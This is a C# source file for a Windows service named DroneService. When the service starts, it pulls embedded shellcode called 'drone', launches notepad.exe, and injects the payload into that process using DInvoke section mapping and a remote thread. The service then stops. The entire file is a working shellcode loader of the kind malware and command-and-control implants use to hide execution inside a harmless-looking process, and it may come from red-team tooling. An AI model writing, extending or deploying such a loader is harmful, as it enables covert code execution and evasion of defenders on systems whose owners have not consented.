using System.Diagnostics;
using System.ServiceProcess;
using System.Threading;

using DroneService.DInvoke.Injection;

namespace DroneService
{
    public partial class Service : ServiceBase
    {
        public Service()
        {
            InitializeComponent();
        }
        
        protected override void OnStart(string[] args)
        {
            var shellcode = Utilities.GetEmbeddedResource("drone");
            var payload = new PICPayload(shellcode);
            var alloc = new SectionMapAlloc();
            var exec = new RemoteThreadCreate();
            var process = Process.Start(SpawnTo);

            _ = Injector.Inject(payload, alloc, exec, process);
            
            Thread.Sleep(5000);
            
            Stop();
        }

        private static string SpawnTo => @"C:\Windows\System32\notepad.exe";
    }
}
